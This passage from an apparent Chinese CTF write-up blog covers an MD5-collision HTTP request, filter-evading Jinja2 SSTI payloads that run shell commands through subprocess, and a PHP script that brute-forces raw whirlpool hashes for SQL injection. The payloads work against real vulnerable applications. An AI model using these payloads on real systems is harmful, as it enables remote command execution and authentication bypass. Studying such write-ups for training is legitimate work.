class="line">%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A</span><br><span class="line"></span><br><span class="line">%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A</span><br><span class="line"></span><br><span class="line">%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A</span><br></pre></td></tr></table></figure>

<p>发包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;?val1&#x3D;s878926199a&amp;val2&#x3D;s155964671a&amp;val3&#x3D;%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%1A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%6E%D0%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%09%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%96%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%F5%51%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%E0%C1%24%A3%03&amp;val4&#x3D;%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%9A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%EE%CF%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%89%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%16%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%75%52%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%60%C1%24%A3%03&amp;m&#x3D;a&amp;n&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line">Host: 183.129.189.60:10004</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko&#x2F;20100101 Firefox&#x2F;72.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 2337</span><br><span class="line">Origin: http:&#x2F;&#x2F;183.129.189.60:10004</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;183.129.189.60:10004&#x2F;?val1&#x3D;s878926199a&amp;val2&#x3D;s155964671a&amp;val3&#x3D;%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%1A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%6E%D0%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%09%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%96%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%F5%51%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%E0%C1%24%A3%03&amp;val4&#x3D;%31%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%5C%2E%E1%FB%93%0D%11%1A%69%A3%1E%0E%DA%12%47%BE%01%A2%DD%9A%B8%7C%72%E2%19%C6%3F%7A%88%BF%0C%40%51%F1%F1%CA%80%24%1E%6A%8F%C8%CD%F4%07%EE%CF%AA%A3%6D%42%80%6A%C9%7C%AB%C7%79%99%89%7E%A6%F6%CC%31%B9%65%20%36%B3%65%15%2D%77%50%FA%C1%8B%FC%86%D8%27%E5%16%20%7D%A1%1E%DD%5B%14%C5%5C%19%5D%32%75%29%57%E2%5C%DC%61%31%71%6F%B0%0F%8A%75%52%0A%0D%12%97%E5%5E%21%0A%16%EF%95%3E%60%C1%24%A3%03&amp;val5&#x3D;%7A%40%F4%BF%DD%6F%8D%AD%CC%94%E7%9C%3F%0E%F7%8E%AD%4B%5D%12%FF%DB%38%3C%52%6E%43%79%4B%8C%BE%CD%76%F3%F2%EC%C0%47%EB%F4%6B%FC%E3%DA%FF%7B%F9%8F%DA%DC%35%88%80%05%E6%6C%25%3E%47%CA%84%8C%DF%B6%9A%27%6A%0E%95%52%01%D1%57%E9%7F%2F%C5%75%CB%0E%DA%2D%7D%9D%2F%E6%2D%61%D3%1A%76%B7%EC%46%FE%E7%4E%7D%46%59%F4%4F%E0%8F%7A%5E%5D%EF%C0%2C%15%EB%2A%10%1B%D6%8B%1C%16%D2%F8%8E%93%C3%0F%93%72%5C&amp;val6&#x3D;%39%98%EB%F3%ED%EC%0F%45%C0%89%DD%13%77%E0%88%34%41%BF%20%0B%2B%1B%D8%D0%40%5A%7A%6E%52%92%AF%C8%5B%FD%E4%F5%E2%2A%EA%FC%CB%25%63%59%98%7B%78%54%24%A1%35%20%A5%2A%D6%22%35%04%B2%74%01%03%9E%F7%08%01%88%BA%03%88%01%09%65%96%5D%D2%A6%A2%3B%FF%AF%97%3D%88%50%1C%13%DA%49%B3%20%00%3A%60%88%E7%D7%B3%28%58%AF%04%6C%FC%F5%FE%0D%93%42%70%00%BD%EA%CE%D1%14%B4%B1%8E%47%8D%AD%2E%E5%2D%64%1D%3A&amp;val7&#x3D;%7A%40%F4%BF%DD%6F%8D%AD%CC%94%E7%9C%3F%0E%F7%8E%AD%4B%5D%92%FF%DB%38%3C%52%6E%43%79%4B%8C%BE%CD%76%F3%F2%EC%C0%47%EB%F4%6B%FC%E3%DA%FF%FB%F8%8F%DA%DC%35%88%80%05%E6%6C%25%3E%47%4A%84%8C%DF%B6%9A%27%6A%0E%95%52%01%D1%57%E9%7F%2F%C5%75%CB%0E%DA%2D%7D%1D%2F%E6%2D%61%D3%1A%76%B7%EC%46%FE%E7%4E%7D%46%59%F4%4F%E0%8F%7A%5E%5D%EF%C0%AC%15%EB%2A%10%1B%D6%8B%1C%16%D2%F8%8E%93%43%0F%93%72%5C&amp;m[]&#x3D;8c8d357b5e872bbacd45197626bd5759&amp;n[]&#x3D;523af537946b79c4f8369ed39ba78605</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">val5&#x3D;%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A&amp;val6&#x3D;%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%5B%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%51%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%87%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%2E%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%3C%09%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%22%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%27%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%80%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%CF%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%B8%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%B4%7D%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%F6%95%5C%28%8A&amp;val7&#x3D;%CD%D1%2D%CB%2E%94%AE%DA%88%88%E7%24%13%47%D7%3D%5D%EC%36%DB%B7%15%2C%3A%18%9E%82%61%CC%C4%A5%40%E5%CB%AE%DA%7C%25%3E%6C%EB%41%BF%B3%D4%D1%9D%47%A8%BC%D4%39%F7%77%86%CE%00%DB%AA%07%23%89%70%E6%4E%A9%00%91%90%46%10%25%17%56%0E%51%2F%1E%DE%51%A6%DF%43%AE%01%66%2E%2A%C9%1A%F6%46%EC%47%E2%EB%30%64%46%19%06%59%DB%FD%7A%88%70%AF%C3%BC%08%ED%54%08%96%F2%6F%29%F5%70%55%C6%7A%A2%89%61%D3%85%96%89%B2%64%E5%3A%AD%95%DA%EA%7B%9D%17%7F%5B%E1%B9%23%2C%A7%23%54%CF%82%42%16%39%8A%28%20%B0%27%6D%CB%1A%EB%42%8D%EA%F2%4B%DE%B7%1C%0A%00%F6%90%19%6A%C9%F9%DB%F6%CD%49%FC%BF%D7%4F%CA%E8%A0%FF%0C%40%89%BD%0F%FC%80%0E%E3%0E%D2%C4%CB%E2%95%E4%8B%B8%2B%38%09%BE%7A%3D%FE%AC%F2%96%CC%3A%3D%BE%95%27%7F%F4%41%B1%19%A6%3A%A7%15%6A%9B%34%7E%FE%E4%90%AE%88%74%C3%13%65%DE%D5%7B%76%95%5C%28%8A&amp;a&#x3D;byGcY&amp;b&#x3D;aOtm2</span><br></pre></td></tr></table></figure>

<p>即可拿到flag</p>
<p><a href="[http://www.gtfly.top/2019/04/07/%E6%8E%98%E5%AE%89%E6%9D%AFwp.html#audit](http://www.gtfly.top/2019/04/07/掘安杯wp.html#audit)">参考链接</a></p>
<h1 id="easyflask1"><a href="#easyflask1" class="headerlink" title="easyflask1"></a>easyflask1</h1><p>给出提示，应该是ssti</p>
<p>在404页面注入</p>
<p><img src="../pic/123.png" alt=""></p>
<p>经过测试过滤了<code>-</code>,<code>.</code>。</p>
<p>参考链接<a href="https://fireshellsecurity.team/asisctf-fort-knox" target="_blank" rel="noopener">https://fireshellsecurity.team/asisctf-fort-knox</a></p>
<p>操作</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__[1].__subclasses__()[&#39;&#39;&#39;找到warnings.catch_warnings&#39;&#39;&#39;].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;subprocess&#39;).check_output(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>

<p>114师傅的payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">##payload不需要这么长，可以连续格式化字符串，也可以只把_和.用格式化字符串替代</span><br><span class="line">#没找到flag，先看目录，发现start.sh可读</span><br><span class="line">&#123;&#123;&#39;&#39;[&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](99)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;mro&#39;]()[1][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](117)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](99)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](101)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)]()[65][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](110)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](103)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](111)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](117)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](110)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](109)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](112)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](111)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](114)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)](&#39;subprocess&#39;)[&#39;check&#39;+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;output&#39;]([&#39;ls&#39;,&#39;&#x2F;&#39;])&#125;&#125;</span><br><span class="line">#读取start.sh中存在sed -i &quot;s&#x2F;1ad0633b78d14695b04f105c14674b0d4&#x2F;$1&#x2F;g&quot; &#x2F;flag\n</span><br><span class="line">&#123;&#123;&#39;&#39;[&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](99)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;mro&#39;]()[1][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](117)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](99)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](101)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)]()[231][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](110)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](103)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](111)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](97)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](98)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](117)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](108)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](110)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](115)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)][&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](105)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](109)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](112)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](111)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](114)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](116)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)](&#39;subprocess&#39;)[&#39;check&#39;+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](95)+&#39;output&#39;]([&#39;cat&#39;,&#39;&#x2F;start&#39;+&#39;&#123;0:c&#125;&#39;[&#39;format&#39;](46)+&#39;sh&#39;])&#125;&#125;</span><br></pre></td></tr></table></figure>





<h1 id="HashIsTrue"><a href="#HashIsTrue" class="headerlink" title="HashIsTrue"></a>HashIsTrue</h1><p>给了提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注意如下题目内容：$pw &#x3D; hash(&quot;whirlpool&quot;,$pass,true); $sql &#x3D; &quot;select * from user where username&#x3D;&#39;$user&#39; and password&#x3D;&#39;$pw&#39;&quot;;</span><br></pre></td></tr></table></figure>

<p> hash(“whirlpool”,$pass,true)当hash函数开启true时，会返回字符串，而不是16进制。</p>
<p>可以制造MD5后的包含‘= ’ (没有想通)</p>
<p>编写脚本参考着114师傅</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for($i&#x3D;0;;$i++)</span><br><span class="line">&#123;</span><br><span class="line">    $pass&#x3D;$i;</span><br><span class="line">    $pw &#x3D; hash(&quot;whirlpool&quot;,$pass,true);</span><br><span class="line">    if(preg_match(&#39;&#x2F;\&#39;&#x3D;\&#39;&#x2F;&#39;,$pw ))</span><br><span class="line">    &#123;</span><br><span class="line">        echo $i;</span><br><span class="line">        echo urldecode(&#39;%09&#39;);</span><br><span class="line">        echo $pw;</span><br><span class="line">        echo urldecode(&#39;%0a&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>关于云之家的分析</title>
    <url>/2020/02/25/%E5%85%B3%E4%BA%8E%E4%BA%91%E4%B9%8B%E5%AE%B6%E7%9A%84%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<script src=/js/crypto-js.js></script>
<script>
function doDecrypt (pwd, onError) {
	console.log('in doDecrypt');
	const txt = document.getElementById('enc_content').innerHTML;
	let plantext;
	try {
		const bytes = CryptoJS.AES.decrypt(txt, pwd);
		var plaintext = bytes.toString(CryptoJS.enc.Utf8);
	} catch(err) {
		if(onError) {
			onError(err);
		}
		return;
	}
	document.getElementById('enc_content').innerHTML = plaintext;
	document.getElementById('enc_content').style.display = 'block';
	document.getElementById('enc_passwd').style.display = 'none';
	if(typeof MathJax !== 'undefined') {
		MathJax.Hub.Queue(
			['resetEquationNumbers', MathJax.InputJax.TeX],
			['PreProcess', MathJax.Hub],
			['Reprocess', MathJax.Hub]
		);
	}
}
</script>
<div id="enc_content" style="display:none">U2FsdGVkX19dCFf8ytvD9pA36aoxrtYCbQ7AAe1hF3EdTNktWJXDM7bxGnD5ab6i83+TramFBD3k5YTWtYG/bd/kw6py7+mpwtgtsOhAma74osHxyrxLpOs7w0Un/O4InhXDOZt+ki6xBJF+rA7WkLCL9kSTN/lHm54VP26uZY6OUXmKS7+Vf7ymMEYNaDAwd6G7BMviaIKqTdayata7ZcKPbfQGNkC4iakeeoKMu3UVWG9Cipwk67NjPMGdxK8uGSEnd/MaVaR6s6SouAS5kZUuw3XdTjyXsgH2Vo9qr33mtbi6DeC/1sKgvyqF6eKB3t5wqHypOIckmP7MwjDbluf4SlN5YbvZyQLTOpSridGeo5nHTNiCF0UNLXvi2/fGpVBQ5sTbdZEMYxyZcrYfnTxDN2I0PXKEEFzxKMEVgX1jekV9hiCXvR0+gnEJ1CXiI+OgT377w246RdG0/GEhVYNIOvHYrVtDEIrSEdfCyvIPidkRkxCVOnKQhclsVdXkmHJ2WOGAsSiB4NTlKBMxNV32osaythzZiQzjEVvaSWyi/8u2ZCxqIx+Vpe6A75/r4HVzC2ioHDzHgVnH3VGf4iOLUdiK1gNSxDaMpBA/YBZdFTEV1UgK5htahkFocX1hGu6GdfwHyHnAWCG/D6LyYR6e4yGtBxbzrPd3fbD/MF